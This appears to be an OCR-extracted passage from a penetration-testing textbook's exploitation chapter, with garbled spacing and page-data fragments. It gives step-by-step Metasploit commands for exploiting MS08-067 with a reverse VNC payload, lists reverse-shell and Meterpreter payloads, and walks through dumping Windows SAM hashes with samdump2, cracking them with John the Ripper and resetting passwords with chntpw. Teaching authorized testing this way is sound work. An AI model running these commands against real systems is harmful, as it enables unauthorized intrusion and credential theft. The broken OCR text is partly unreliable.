you have learned this simple process, owning a vulnerable target becomes a cinch. in order to correlate a target’s vulnerabilities with me tasploit’s exploits, we need to review our findings from step 2. we will start this process by focus- ing on the ne ssus output. re call that ne ssus is a vulnerability scanner and provides us with a list of known weaknesses or missing patches. wh en review- ing the ne ssus output, you should make notes of any findings but pay special attention to the vulnerabilities labeled as “High.” ma ny “High” ne ssus vulner- abilities, especially missing mi crosoft patches, correlate directly with me tasploit exploits. Assume that during your penetration test you uncovered a new target at i P address 172.16.45.130. running n map tells you that your new target is a w indows x P machine with s ervice Pack 3 installed. c ontinuing on with step 2, we run n essus against the target. f igure 4.3 shows the n essus report for 172.16.45.130. notice there are two “High” findings. i t is possible to drill down into each of the “High” findings to get the specific information from n essus. d ouble clicking on the first “High” finding reveals the source of this issue is a missing patch. s pecifically, m icrosoft patch ms 08- 067 has not been installed on the target machine. c licking on the second"},{"pageNumber":93,"pageContent":"The Basics of hacking and penetration T esting 74 “High” vulnerability discovered by n essus reveals another missing m icrosoft patch. t his vulnerability is the result of missing m icrosoft patch ms 09-001. f igure 4.4 highlights the nessus report showing missing patch ms08-067. At this point, we know our target has two missing patches. Both of these patches are labeled as “High” and the descriptions that ne ssus provides for both missing patches mention “remote code execution.” As an attacker your heartbeat should be racing a little at this point, because the chances are very good that me tasploit will be able to exploit the target for us. n ext we need to head over to m etasploit and look for any exploits pertaining to ms 08-067 or ms 09-001. o nce we have started m etasploit (and updated), we can use the “search” command to locate any exploits related to our n essus findings. to accomplish this, we issue the “search” command followed by the missing patch number. for example , at the “ msf  ” prompt you would type: msf  search ms08-067 once the command is completed, make detailed notes on the findings and search for any other missing patches. m etasploit will search through its infor- mation and return any relevant information it finds. f igure 4.5 shows the out- put of searching for ms08-067 and ms09-001 within metasploit. f IGURE 4.4 Screenshot Showing Missing Patch MS08-067 on the Target. f IGURE 4.3 Nessus Output Showing Two “High” Findings."},{"pageNumber":94,"pageContent":"Exploitation ChApTER 4 75 l et us review the output from figure 4.5: n w e started by issuing the “search” command followed by the specific miss- ing patch that nessus discovered. n After searching, m etasploit found a matching exploit and provided us with several pieces of information about the exploit. l f irst it provided us with a name and location; “windows/smb/ ms08_067_netapi.” l n ext metasploit provided us with a “ rank.” i t is important to pay close attention to the exploit rank. t his information pro- vides details about how dependable the exploit is (how often the exploit is suc- cessful) as well as how likely the exploit is to cause instability or crashes on the target system. n umerically, the higher an exploit is ranked, the more likely it is to succeed and the less likely it is to cause disruptions on the target system. m etasploit uses seven ratings to rank each exploit: 1. m anual 2. l ow 3. A verage 4. n ormal 5. g ood f IGURE 4.5 Finding a Match between Nessus and Metasploit with the Search Function. ALERT ! The Metasploit “search” feature can also be used to locate non-Microsoft exploits. Nessus reports will often include a CVE or BID number to reference critical vulnerabilities. If you are unable to locate a missing MS patch or are conducting a penetration test against a non-Microsoft product, be sure to search for matching exploits by CVE or BID numbers! Look for these in your Nessus scan report."},{"pageNumber":95,"pageContent":"The Basics of hacking and penetration T esting 76 6. g reat 7. e xcellent You can find more information and a formal definition of the ranking meth- odology on the m etasploit.com website. f inally, the m etasploit search feature presents us with a brief description of the exploit providing us with additional details about the attack. w hen all other things are held equal, you should choose exploits with a higher rank, as they are less likely to disrupt the normal functioning of your target. n ow that you understand how to match up vulnerabilities in n essus with exploits in m etasploit and you have the ability to choose between two or more m etasploit exploits, we are ready to unleash the full power of m etasploit on our target. c ontinuing with our example, we will use the ms 08-067 because it has a higher ranking. i n order to run m etasploit, we need to provide the framework with a series of commands. Because m etasploit is already running and we have already found our exploit we continue by issuing the “use” command in the “msf  ” terminal to set the desired exploit. msf  use windows/smb/ms08_067_netapi this command tells m etasploit to use the exploit that n essus identified. o nce we have the exploit loaded, we need to view the available payloads. t his is accomplished by entering “show payloads” in the “msf  ” terminal. msf  show payloads this will list all the available and compatible payloads for the exploit you have chosen. to select one of the payloads, we type “set payload” and the payload name into the “msf  ” terminal. msf  set payload windows/vncinject/reverse_tcp there are many, many payloads to choose from. A full examination of the dif- ferent payloads is outside the scope of this book. Please review the m etasploit documentation for details on each of the available payloads. for this example, we will install V nc on the target machine and then have that machine connect back to us. i f you are unfamiliar with V nc, it is remote control P c software that allows a user to connect to a remote machine, view the remote machine, and control the mouse and keyboard as if you were physically sitting at that machine. it works much the same as remote desktop or a terminal server. it is important to note that the V n c software is not currently installed on the tar- get machine. re member that some exploits give us the ability to install software on our target machine. in this example, we are sending an exploit to our target machine. if successfully executed, the exploit will call the “install vnc” payload and remotely install the software on the victim machine without any user interaction. d ifferent payloads will require different additional options to be set. i f you fail to set the required options for a given payload, your exploit will fail. t here are"},{"pageNumber":96,"pageContent":"Exploitation ChApTER 4 77 few things worse than getting this far and failing to set an option. Be sure to watch this step closely. to view the available options, issue the “show options” in the “msf  ” terminal: msf  show options After issuing the show options command, we are presented with a series of choices that are specific to the payload we have chosen. w hen using the “win- dows/vncinject/reverse_tcp” payload, we see that there are two options that need to be set because they are missing any default information. t he first is “rHost” and the second is “ lHost .” r Host is the i P address of the remote host and l Host is the i P address you are attacking from. to set these options, we issue the “set option_name” command in the msf  terminal: msf  set RHOST 172.168.45.130 msf  set LHOST 172.168.45.135 now that you have required options set, it is usually a good idea at this point to reissue the “show options” command to ensure you are not missing any information. msf  show options once you are sure you have entered all the information correctly, you are ready to launch your exploit. to send your exploit to the target machine, simply type “exploit” into the “msf  ” terminal msf  exploit no w sit back and watch as the magic happens. to truly appreciate the beauty and complexity of what is going on here, you need to build your understanding of buffer overflows and exploitation. th is is something that is highly encouraged when you finish the basics covered in this book. me tasploit gives you the ability to stand on the shoulders of giants and the power to launch incredibly complex attacks with just a few commands. You should revel in the moment and enjoy the victory of conquering your target, but you should also commit yourself to learning even more. co mmit yourself to really understanding exploitation. After typing “exploit” me tasploit will go off and do its thing, sending exploits and payloads to the target. th is is where the “hacking like Hugh Jackman” part comes in. if you set up everything correctly, after a few seconds you will be pre- sented with a screen belonging to your victim machine. Because our payload in this example was a V n c install, you will have the ability to view and interact with the target machine as if you were physically sitting in front of it. it is hard not to be impressed and even a little bewildered the first time you see (or complete) this exploit in real time. fi gure 4.6 shows an example of the completed me tasploit attack. no tice, the computer that launched the attack is the li nux Backtrack, but the attacker machine has full gUi access to the wi ndows desktop of the victim. Below you will find a cheat sheet of the steps required to run m etasploit against a target machine."},{"pageNumber":97,"pageContent":"The Basics of hacking and penetration T esting 78 1. s tart metasploit: a. o pen a terminal and issue the following command /pentest/exploits/ framework3/msfconsole 2. i ssue the “search” command to search for exploits: a. msf  search missing_patch_number 3. i ssue the “use” command to select the desired exploit: a. msf  use exploit_name_and_path_as_shown_in_2a 4. i ssue “show payloads” command to show available payloads: a. msf  show payloads 5. i ssue “set” command to select payload a. msf  set payload path_to_payload_as_shown_in_4a 6. i ssue “show options” to view any options needing to be filled out before exploiting the target a. msf  show options 7. i ssue the “set” command for any options listed in 6a a. msf  set option_name desired_option_input 8. i ssue “exploit” command to launch exploit against target a. msf  “exploit” no w that you have a basic understanding of how to use me tasploit, it is impor- tant to review a few more of the basic payloads available to you. ev en though the V n c inject is incredibly cool and great for impressing friends, relatives, and coworkers, it is rarely used in an actual P t. in most penetration tests, hackers prefer a simple shell allowing remote access and control of the target machine. ta ble 4.1 is a list of some basic payloads. Please refer to the me tasploit docu- mentation for a complete list. re member, one of the powers of me tasploit is the ability to mix and match exploits and payloads. th is provides a penetra- tion tester with an incredible amount of flexibility, allowing the functionality f IGURE 4.6 Screenshot Showing Successful Exploit of Windows Target."},{"pageNumber":98,"pageContent":"Exploitation ChApTER 4 79 of me tasploit to change depending on the desired outcome. it is important that you become familiar with the various payloads available to you. m any of these same payloads exist for l inux, B sd, osx , and other operating systems. Again, you can find the full details by reviewing the m etasploit docu- mentation closely. o ne source of confusion for many people is the difference between similar payloads like “windows/meterpreter/bind_tcp” and “win- dows/meterpreter/reverse_tcp.” t he keyword that causes the confusion here is “reverse.” t here is a simple but important difference between the two payloads and knowing when to use each will often mean the difference between an exploit’s success or failure. t he key difference in these attacks is the direction of the connection after the exploit has been delivered. i n a “bind” payload, we are both sending the exploit and making a connection to the target from the attacking machine. i n this instance, the attacker sends the exploit to the target and the target waits passively for a connection to come in. After sending the exploit, the attacker’s machine then connects to the target. in a “reverse” payload, the attacking machine sends the exploit but forces the target machine to connect back to the attacker. in this type of attack, rather than passively waiting for an incoming connection on a specified port or service, the target machine actively makes a connection back to the attacker. fi gure 4.7 should make this concept clearer. t he last m etasploit topic to discuss is the m eterpreter. t he m eterpreter is a powerful and flexible tool that you will need to learn to control if you are going to master the art of m etasploit. t he m eta-interpreter, or m eterpreter, is a Table 4.1 Sample of Payloads A vailable for Targeting Windows Machines Metasploit Payload Name Payload Description windows/adduser Create a new user in the local administrator gr oup on the target machine windows/exec Execute a Windows binary (.exe) on the target machine windows/shell_bind_tcp Open a command shell on the target machine and wait for a connection windows/shell_reverse_tcp Target machine connects back to the attacker and opens a command shell (on the tar get) windows/meterpreter/bind_tcp Target machine installs the Meterpreter and waits for a connection windows/meterpreter/reverse_tcp Installs Meterpreter on the target machine then cr eates a connection back to the attacker windows/vncinject/bind_tcp Installs VNC on the target machine and waits for a connection windows/vncinject/reverse_tcp Installs VNC on the target machine and sends VNC connection back to tar get Table 4.1"},{"pageNumber":99,"pageContent":"The Basics of hacking and penetration T esting 80 payload available in m etasploit that gives attackers a powerful command shell that can be used to interact with their target. Another big advantage of the m eterpreter is the fact that it runs entirely in memory and never utilizes the hard drive. t his tactic provides a layer of stealth that helps it evade many anti-virus systems and confounds some foren- sic tools. th e me terpreter functions in a manner similar to wi ndows cmd.exe or the li nux /bin/sh command. on ce installed on the victim machine, it allows the attacker to interact with and execute commands on the target as if the attacker were sit- ting at the local machine. it is very important to understand that the me terpreter will run with the privileges associated with the program that was exploited. fo r example, assume that our favorite ne twork Admin Ben ow ned, has disregarded all common sense and is running his i rc program as “root” (the li nux equiva- lent of the wi ndows “Administrator” account). Unfortunately for Ben, his sys- tem is out-of-date, and during a recent penetration test the attacker was able to exploit Ben’s i rc client installing me tasploit’s me terpreter. Because Ben was run- ning the i rc program as the root account, and because the i rc program was exploited by me tasploit, the me terpreter is now able to function with all the privileges and rights of the “root” account! th is is one example in a long list of reasons why it is important to run all of your programs with the most restrictive privileges possible, and avoid running anything as root or administrator. Another reason for using the m eterpreter over a traditional cmd or l inux shell stems from the fact that starting either of these on a target machine often starts a new process that can be detected by a keen user or wily administrator. t his means that the attacker raises his or her visibility and chances of detection while interacting with the target machine. f urthermore, both the cmd.exe and / bin/sh provide a limited number of tools and commands that can be accessed. i n contrast, the m eterpreter was built from the ground up to be used as sort of f IGURE 4.7 Difference between Bind and Reverse Payloads."},{"pageNumber":100,"pageContent":"Exploitation ChApTER 4 81 “hacker’s cmd” with the ability to access and control the most popular tools and functions needed during a penetration test. th e me terpreter has many great features that are built in by default. Basic func- tions include the “migrate” command, which is useful for moving the server to another process. mi grating the me terpreter server to another process is important in case the vulnerable service you attacked is shut down or stopped. Another use- ful function is the “cat” command that can be used to display local file contents on the screen. th is is useful for reviewing various files on the target. th e “down- load” command allows you to pull a file or directory from the target machine, making a local copy on the attacker’s machine. th e “upload” command can be used to move files from the attacker’s machine to the target machine. th e “edit” command can be used to make changes to simple files. th e “execute” com- mand can be used to issue a command and have it run on the remote machine, whereas “kill” can be used to stop a process. th e following commands are also useful and provide the exact same function as they do on a normal li nux machine: “cd,” “ls,” “ps,” “shutdown,” “mkdir,” “pwd,” and “ifconfig.” s ome of the more advanced features include the ability to extract password hashes through the s Am Juicer tool, the ability to interact with a ruby shell, the ability to load and execute arbitrary dll s on the target, and even the ability to lock out the local keyboard and mouse! As you can see, gaining access to a m eterpreter shell is one of the most power- ful, flexible, and stealthy ways that an attacker can interact with a target. i t is well worth your time to learn how to use this handy tool. JOhN ThE RIpp ER : KING Of ThE pASSW ORD CRA CKERS it is hard to imagine discussing a topic like the basics of hacking without dis- cussing passwords and password cracking. n o matter what we do or how far we advance, it appears that passwords remain the most popular way to protect data and allow access to systems. w ith this in mind, let us take a brief detour to cover the basics of password cracking. t here are several reasons why a penetration tester would be interested in crack- ing passwords. f irst and foremost, this is a great technique for elevating and escalating privileges. c onsider the following example: assume that you were able to compromise a target system but after logging in you discover that you have no rights on that system. n o matter what you do, you are unable to read and write to the target’s files and folders and even worse, you are unable to install any new software. t his is often the case when you get access to a low privileged account belonging to the “user” or “guest” group. i f the account you accessed has no or few rights, you will be unable to per- form many of the required steps to further compromise the system. i have actu- ally been involved with several red team exercises where seemingly competent hackers are at a complete loss when presented with an unprivileged account."},{"pageNumber":101,"pageContent":"The Basics of hacking and penetration T esting 82 they throw up their hands and say “ does anyone want unprivileged access to this machine? i don’t know what to do with it.” i n this case, password crack- ing is certainly a useful way to escalate privileges and often allows us to gain administrative rights on a target machine. Another reason for cracking passwords and escalating privileges is that many of the tools we run as penetration testers require administrative-level access in order to install and execute properly. i t is not uncommon for penetration tes- ters to find themselves in a situation where they were able to crack the local administrator password (the local admin account on a machine) and have this password turn out to be the exactly same password that the n etwork Administrator was using for the domain administrator account. i f we can access the password hashes on a target machine, the chances are good that with enough time, John the r ipper (Jt r), a password-cracking tool, can discover the plaintext version of a password. Password hashes are ... and can be accessed remotely or locally. regardless of how we access the hash file, the steps and tools required to crack the passwords remain the same. i n its most basic form, password cracking consists of two parts: 1. l ocate and download the target system’s password hash file. 2. Use a tool to convert the hashed (encrypted) passwords into a plaintext password. mo st systems do not store your password as the plaintext value you enter, but rather they store an encrypted version of the password. th is encrypted version is called a hash. fo r example, assume you pick a password “qwerty“ (which is obviously a bad idea). wh en you log into your P c, you type your password “qwerty” to access the system. However, behind the scenes your computer is actually calculating and checking an encrypted version of the password you entered. th is encrypted version or hash of your password appears to be a ran- dom string of characters and numbers. d ifferent systems use different hashing algorithms to create their password hashes. m ost systems store their password hashes in a single location. t his hash file usually contains the encrypted passwords for several users and sys- tem accounts. Unfortunately, gaining access to the password hashes is only half the battle because simply viewing or even memorizing a password hash (if such a thing were possible) is not enough to determine the plaintext. t his is because technically it is not supposed to be possible to work backward from a hash to plaintext. By its definition, a hash, once encrypted, is never meant to be unencrypted. ALERT! Password Hint #1: Never, never, never use the same password for your local machine administrator as you do for your domain administrator account."},{"pageNumber":102,"pageContent":"Exploitation ChApTER 4 83 consider the following example. Assume that we have located a password hash and we want to discover the plaintext value. i t is important to understand that in most cases we need the plaintext password, not the hashed password. e ntering the hashed value into the system will not get us access because this would simply cause the system to hash the hash (which is obviously incor- rect). i n order to discover the plaintext version of a password, we need to circle through a series of steps. f irst we select a hashing algorithm, next we pick a plaintext word, third we encrypt the plaintext word with the hashing algorithm, and finally we compare the output or hash of the chosen word with the hash from our target. i f the hashes match we know the plaintext password because no two different plain- text words should produce the exact same hash. Although this may seem like a clumsy, awkward, or slow process for a human, computers specialize in tasks like this. g iven the computing power available today, completing the four-step process outlined above is trivial for a modern machine. t he speed at which John the r ipper can generate password hashes will vary depending on the algorithm being used to create the hashes and the hardware that is running John the r ipper. i t is safe to say that even an average computer is capable of generating millions of w indows ( lm) password guesses every second. John the r ipper includes a nifty feature that allows you to bench- mark your computer’s performance. t his benchmark will be measured in cracks per second (c/s). You can run this by navigating to the following direc- tory /pentest/passwords/jtr and running the following command: ./john --test this will provide you with a list of performance metrics and let you know how efficient your system is at generating guesses based on your hardware and the algorithm being used to hash the passwords. Before we can crack passwords, we first have to locate the password hash file. As mentioned earlier, most systems store the encrypted password hashes in a single location. i n w indows-based systems, the hashes are stored in a special file called the s Am ( security Account m anager) file. o n nt-based w indows systems including w indows 2000 and above, the s Am file is located in the c :\\ w indows\\ system32\\ config\\ directory. n ow that we know the location of the s Am file, we need to extract the password hashes from the file. Because the s Am file holds some very important information, m icrosoft has wisely added some additional security features to help protect the file. f irst the s Am file is actually locked when the operating system boots up. t his means that while the os is running we do not have the ability to open or copy the s Am file. i n addition to the lock, the entire s Am file is encrypted and not viewable. fo rtunately, there is a way to bypass both of these restrictions. on a remote machine, we can use the me terpreter and sAm Juicer to access the hashes on a live target. if we have physical access to the system, we can also boot to an alternate"},{"pageNumber":103,"pageContent":"The Basics of h acking and p enetration Testing 84 operating system like Backtrack. By booting our target to an alternate operating system, we are able to bypass the w in dows s A m l ock. t hi s is possible because the w in dows os n ever starts, the lock never engages, and we are free to access the s A m fi le. Unfortunately, the s A m fi le is still encrypted, so we need to use a tool to access the hashes. f or tunately, the required tool is built into Backtrack. After booting the target system to an alternate operating system, the first thing you need to do is to mount the local hard drive. Be sure to mount the drive containing the w indo ws folder. w e can accomplish this by opening a terminal and typing: mount /dev/sda1 /mnt/sda1 i t is important that you mount the correct drive as not all systems will have a /dev/sda1. i f you are unsure about which drive to mount, you can run the “fdisk -l” command. t he fdisk tool will list each of the drives available on your target system and should help you determine which drive you need to mount. You may also need to create a mount point in the /mnt directory. t o do so, you can simply use the “mkdir” command: mkdir /mnt/sda1 i f you are unsure about how to use the mount command or locate the proper drive , please review the l inux man pages for the mount command or practice your newly acquired g oogle skills from step 1. o nce you have successfully mounted the local drive in Backtrack, you will be able to browse the w indo ws “ c :\\” drive. You should now be able to navigate to the s A m file. You can do so by typing the following command into a terminal window: cd /mnt/sda1/Windows/system32/config i f everything has gone as planned, you should be in the directory containing the s A m file. t o view the contents of the current folder issue the “ ls” com- mand in the terminal window, you should see the s A m file. f igure 4.8 shows a screenshot displaying each of the steps required to locate the s A m file (assum- ing you have a /mnt/sda1 directory already created). i n step 1 we issue the “fdisk –l” command to view the available drives on the local disk. i n step 2, fdisk responds back by stating that there is a drive at / dev/sda1. i n step 3 we use this information to mount the drive into our /mnt/ sda1 folder so that we can access the local hard drive. n o w that our drive is mounted and available, in step 4 we move into the directory containing the s A m file by using the “cd” (change directory) command. i n step 5 we verify that we are in the proper directory by issuing the “ls” command to list the con- tents of the current folder. f inally , step 6 shows the s A m file . n o w that we have located the s A m file, we can use a tool called s amdump2 to extract the hashes. At this point we have the ability to view and copy the s A m file , in effect overcoming the first security feature, but at this point the s A m D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":104,"pageContent":"Exploitation ChApTER 4 85 file is still encrypted. i n order to view an unencrypted copy of the s Am file, we need to run s amdump2. s amdump2 utilizes a file on the local machine called “system” to decrypt the s Am file. fortunately , the “system” file is located in the same directory as the sAm file. to run sa mdump2, we issue the “samdump2” command followed by the name and location of the “system” file, followed by the name and location of the sAm file we want to view. re call that earlier we had issued the “cd” command to navigate to the wi ndows/system32/config folder. At this point we can extract the contents of the sAm file by running the following command in a terminal: samdump2 system SAM  /tmp/hashes.txt this will invoke the s amdump2 program and appending the “  hashes.txt” command will save the results to a file called “hashes.txt” in Backtrack’s /tmp directory. f igure 4.9 shows a screenshot of the s amdump2 command and dis- plays the contents of the hashes.txt file. n ow that we have the password hashes saved, we need to transfer them off the live Backtrack disk. t his can be done by simply e-mailing the hashes.txt file to yourself or inserting a thumb drive and creating a local copy of the hashes. e ither way, make sure you save the hashes.txt file because you are working off a “live” cd and your changes are not persistent. t his means when you reboot the target machine all the files you created in the Backtrack disk will be gone for good! n ow that you have a copy of the password hashes, you can begin the process of cracking the passwords. to accomplish this task, we will use a tool called John the r ipper. l ike each of the other tools we have examined, John the r ipper is available for free. You can download it by going to http://www.openwall.com/ f IGURE 4.8 Locating the SAM File for Password Cracking."},{"pageNumber":105,"pageContent":"The Basics of hacking and penetration T esting 86 john. Before we begin utilizing John the r ipper, it is important that you under- stand how microsoft creates password hashes. or iginally mi crosoft utilized a hashing algorithm called la n ma nager (or l m for short). l m hashes suffered from several key weaknesses that made password cracking a trivial task. fi rst, when l m hashes are created the entire password is converted to uppercase. co nverting all the characters used in a password to uppercase is a fundamental flaw that greatly reduces the strength of any pass- word. th is is because technically if we hash the word “Password” and “pass- word,” even though they are only different by a single case of a single letter, these two words will produce a different hash output. However, because l m hashes convert every character to upper case, we greatly reduce the number of guesses we need to make. in stead of requiring an attacker to guess “Password,” “Password,” “PA ss word,” and so on, with every possible combination of upper and lower case letters, the attacker only needs to make the single guess of “PA s sword . ” to further compound this issue, every l an m anager password is 14 characters in length. i f a password is less than 14 characters, the missing letters are filled in with null values. i f a password is greater than 14 characters, the password is truncated at 14 characters. t he final nail in the coffin of l an m anager passwords (as if it needed another) is the fact that all stored passwords, which are now 14 characters in length, actually get split in half and stored as two individual 7-character passwords. t he length of a password is one source of its strength; unfortunately because of the lm design, the max password that needs to be cracked is 7 characters. John will actually attempt to crack each of the 7-character halves of the password individually and typically makes very short work out of it. take a moment to consider these flaws. w hen taken together, they represent quite a blow to the security of any system. s uppose our favorite n etwork Admin, Ben o wned is utilizing lm hashes on his w indows machine. He is aware of the dangers of weak passwords so he creates the following password, which he believes is secure: supersecretPassword!@#$. f IGURE 4.9 Extracting and Viewing the Password Hashes with Samdump2."},{"pageNumber":106,"pageContent":"Exploitation ChApTER 4 87 Unfortunately for Ben, he is operating under a false sense of security. His complex password will actually undergo a series of changes that make it much less secure. fi rst the password is converted to all uppercase: sU Pe rsecret P As sword ! @#$. ne xt the password is truncated to be exactly 14 characters, with any remain- ing letters simply discarded. th e new password is: sU Pe rsecret P As. fi nally, the password is broken into equal halves of 7 characters each: sU Pe rse and c ret P As. w hen a hacker or penetration tester gets ahold of Ben’s password, the attacker has to crack two simple, all-uppercase, 7-character passwords. t hat is a drasti- cally simpler task than the original password of supersecretPassword!@#$. fortunately , m icrosoft addressed these issues and now uses a much more secure algorithm called ntlm to create its password hashes. However, as a penetration tester you will still find systems which are utilizing and storing lm hashes. m odern versions of w indows do not use or store lm hashes by default; however, there are options to enable lm on these systems. t his “feature” is implemented to support backward compatibility with legacy systems. As a side note, you should always upgrade, or discontinue the use of any legacy software that requires you to use lm hashes. o ld systems often put your entire network at risk. John the r ipper is capable of cracking passwords by using a password dic- tionary or by brute forcing letter combinations. As we discussed earlier, pass- word dictionaries are lists of words and letter combinations. o ne advantage of using a password dictionary is that it is very efficient. t he main disadvantage of this technique is that if the exact password is not in the dictionary, John the r ipper will be unsuccessful. Another method for cracking passwords is to brute force letter combinations. Brute forcing letter combinations means that the password cracker will generate passwords in a sequential order until it has exhausted every possible combination. for example, the password cracker will begin by guessing the password as a single letter: “a.” i f that guess is unsuccess- ful, it will try “aa.” i f that guess is unsuccessful, it will move to “aaa” and so on. t his process is typically much slower than a dictionary guessing attack, but the advantage is that given enough time, the password will eventually be found. i f we try every letter in every possible combination, there is simply nowhere for a password to hide. However, it is important to point out that brute forcing pass- words of significant length and cipher would take many lifetimes to crack. John the r ipper is built into Backtrack. to run it, we can simply enter the fol- lowing command into a terminal: john invoking this command will actually run a script that will move us to the /pen- test/passw ords/jtr directory. o nce inside the /pentest/passwords/jrt directory, we can issue the following command: ./john /tmp/hashes.txt"},{"pageNumber":107,"pageContent":"The Basics of hacking and penetration T esting 88 in the command above “./john” is used to invoke the password cracking John the r ipper program. d o not omit the “./” before the john command. t his forces l inux to run the program in the current directory. t he next command “/ tmp/hashes.txt” is used to specify the location of the hashes that we extracted using s amdump2. i f you saved your hashes.txt file to a different location, you will need to change this path. i f your target machine is using ntlm hashes, you will need to add the “-f: nt” switch. in this case, the command would look like the following: ./john /tmp/hashes.txt –f:NT After issuing the appropriate command to instruct John the ri pper to run, the program will attempt to crack the passwords contained in the hashes.txt file. wh en John is successful in finding a password, it will display it to the screen. fi gure 4.10 shows the commands used to move into the John directory, running John the ri pper, and the output of usernames and passwords that were cracked. Below you will find a brief recap of the steps used to crack wi ndows passwords. it is important that you practice and fully understand how to complete each of the steps below. if you are given physical access to a machine, you should be able to complete steps 1–4 in less than five minutes. th e time it takes to com- plete step 5, the actual cracking of the passwords, will vary depending on your resources and the quality or strength of the passwords you are cracking. You should also become comfortable enough with each of the steps that you can perform them without the aid of notes or a cheat sheet: 1. s hut down the target machine. 2. Boot the target to Backtack. 3. m ount the local hard drive. 4. Use samdump2 to extract the hashes. 5. Use John the ripper to crack the passwords. t he process of cracking l inux and osx passwords is much the same as the method described above with a few slight modifications. l inux systems do not f IGURE 4.10 Cracked Passwords with John the Ripper."},{"pageNumber":108,"pageContent":"Exploitation ChApTER 4 89 use a s Am file to store the password hashes. rather the encrypted l inux pass- word hashes are contained in a file called the “shadow” file which is located at: /etc/shadow. However, before you can use the /etc/shadow file with John the ri pper, it must be joined with the /etc/passwd file. in many respects this is similar to how we had to use the “system” file with the sAm file to extract wi ndows password hashes. John the ri pper includes a function to combine the shadow and password files so you can continue cracking the passwords. to accomplish this task, you need to use the “unshadow” command, which is located in the /pentest/passwords/jtr directory. to accomplish this, issue the following command in a terminal: ./unshadow /etc/passwd /etc/shadow  /tmp/linux_hashes.txt Here again, it is important not to forget the “./” in front of the “unshadow” command. t his command will join the /etc/passwd with the /etc/shadow file and store the results in a file called “linux_hashes.txt” in the /tmp directory. no w that we have extracted the hashes, we are almost ready to begin cracking the li nux passwords. However, before we can start, we need to use a version of John the ri pper that supports cracking different types of password hashes. if y ou use a wrong version or an unpatched version of John the ri pper, the pro- gram will return a message saying, “ no password hashes loaded.” mo st mod- ern li nux systems store their passwords using the sH A hashing algorithm. wi th this in mind, we have two choices: we can either patch the version of John the ri pper or download a prepatched version. if you are unfamiliar with the patch- ing process and manually compiling li nux source code, it may be easier to find a prepatched version that supports sH A hashes. on ce we have the correct ver- sion of John the ri pper running, we can complete this task by issuing the fol- lowing command from inside the /pentest/passwords/jtr directory: ./john /tmp/linux_hashes.txt John the r ipper contains many more options and switches that can be used to greatly improve your cracking time and chances of success. You should spend some time learning about each of these switches. pASSWORD RESETTING : KIND Of LIKE DRI vING A BULLDOZER ThROUG h ThE SIDE Of A BUILDING there is another option for defeating passwords. t his technique requires phys- ical access to the target machine, and although it is very effective at gaining you access to the target, it is also very noisy. i n the previous section password cracking was discussed. i f a skilled penetration tester is able to access a target machine alone for just a few minutes, he or she should be able to get a copy of the password hashes. All things considered, this could be a very stealthy attack and difficult to detect. i n most cases, the penetration tester will leave few clues that he or she were ever on the target machine. remember the penetration tes- ter can take the passwords off-site and crack them at his or her leisure."},{"pageNumber":109,"pageContent":"The Basics of hacking and penetration T esting 90 Password resetting is another technique that can be used to gain access to a system or to escalate privileges; however, this method is much less subtle than password cracking. w hen first introducing this topic, it is common to compare gaining access to a w indows machine by performing a password reset to a bur- glar driving a bulldozer through the wall of a store in order to gain access to the premises. i t may be effective, but you can be sure that the storeowner and employees will know that they were broken into. Password resetting is a technique that allows an attacker to literally overwrite the s Am file and create a new password for any user on a modern w indows system. t his process can be performed without ever knowing the original pass- word, although it does require you to have physical access to the machine. As with all other techniques discussed in this book, it is vital that you have authorization before proceeding with this attack. it is also important you understand the implications of this technique. on ce you change the password, there will be no way to restore it. As described in the beginning of this section, it is very much like a burglar driving a bulldozer through the side of a building. th e next time a user attempts to log in and he or she finds that the password has been changed, you can bet that someone is going to notice. w ith that in mind, this is still an incredibly powerful technique and one that can be very handy for gaining access to a system. to perform password reset- ting, you will need to boot the target system to a Backtrack dV d. o nce booted, from the terminal you will need to mount the physical hard drive of the system containing the s Am file. You can find the instructions for performing this task in the previous section. After mounting the hard drive, you need to navigate to the “/pentest/passwords/chntpw” directory. You can accomplish this by enter- ing the following command: cd /pentest/passwords/chntpw from here you can run the “chntpw” command to reset the password. to review the full options and available switches, you can issue the following command: ./chntpw –h Assume that you want to reset the administrator password on your target machine. to accomplish this , you would issue the following command: ./chntpw –i /mnt/sda1/WINDOWS/system32/config/SAM in the command above, the “./chntpw” is used to start the password resetting program. t he “-i” is used to run the program interactively and allow you to choose the user you would like reset. t he “/mnt/sda1/ windows /system32/ config/sAm” is the mounted directory containing the s Am file of our target machine. i t is important to make sure you have access to the s Am file; remem- ber not all drives are listed as sda1. As mentioned earlier, running the “fdisk –l” command can be helpful in determining the appropriate drive."},{"pageNumber":110,"pageContent":"Exploitation ChApTER 4 91 After running the “./chntpw –i /mnt/sda1/ windows /system32/config/ sAm” command, you will be presented with a series of interactive menu-driven options that will allow you to reset the password for the desired user. e ach of the steps is very clearly laid out and described; you simply need to take a few moments to read what is being asked. t he program is actually designed with a series of “default” answers and in most cases you can simply hit the “enter” key to accept the default choice. As shown in f igure 4.11, after loading, the first question you are asked is: “what to do [1]?” Above the question you will see a series of five options to choose from. s imply enter the number or letter that corresponds to the choice you want to make and hit the “enter” key to continue. t he “[1]” after the ques- tion indicates that choice “1” is the default. i n our example we are planning to reset the password for the administrator account, so we can type “1” and hit enter or simply hit the enter key to accept the default. n ext we are presented with a list of users available on the local w indows machine. You can select the desired user by typing in his or her user- name as displayed. o nce again, the default option is set to “Administrator.” f igure 4.12 shows a screenshot of the available users. Here again, we can simply hit the “enter” key to accept the default choice of “Administrator.” n ext we are presented with the various options for editing the f IGURE 4.11 Chntpw Interactive Menu. f IGURE 4.12 List of Available Users to Reset Password."},{"pageNumber":111,"pageContent":"The Basics of hacking and penetration T esting 92 user on the target machine as shown in f igure 4.13. Please note that at this step you do not want to accept the default option! As previously mentioned, at this point you want to be sure you select option “1” to clear the password. After entering your selection to clear the user pass- word, you will get a message stating: “Password cleared!” At this point you can reset another user’s password or enter “!” to quit the program. i t is important that you complete the remaining steps because at this point the new s Am file has not been written to the hard drive. i n the menu that follows enter “q” to quit the chntpw program. At last you will be prompted with a message asking if you would like to write your changes to the hard drive. Be sure to enter “y” at this step as the default is set to “n.” t he password for the selected user has now been cleared and is blank. You can shut down Backtrack by issuing the “reboot” command and ejecting the dV d. w hen w indows restarts, you can log into the account by leaving the password blank. w ith a little practice, this entire process, including booting Backtrack, clearing the password, and booting into w indows, can be completed in less than five minutes. SNIffING NETWORK TRA ffIC Another popular technique that can be used to gain access to systems is net- work sniffing. s niffing is the process of capturing and viewing traffic as it is passed along the network. s everal popular protocols 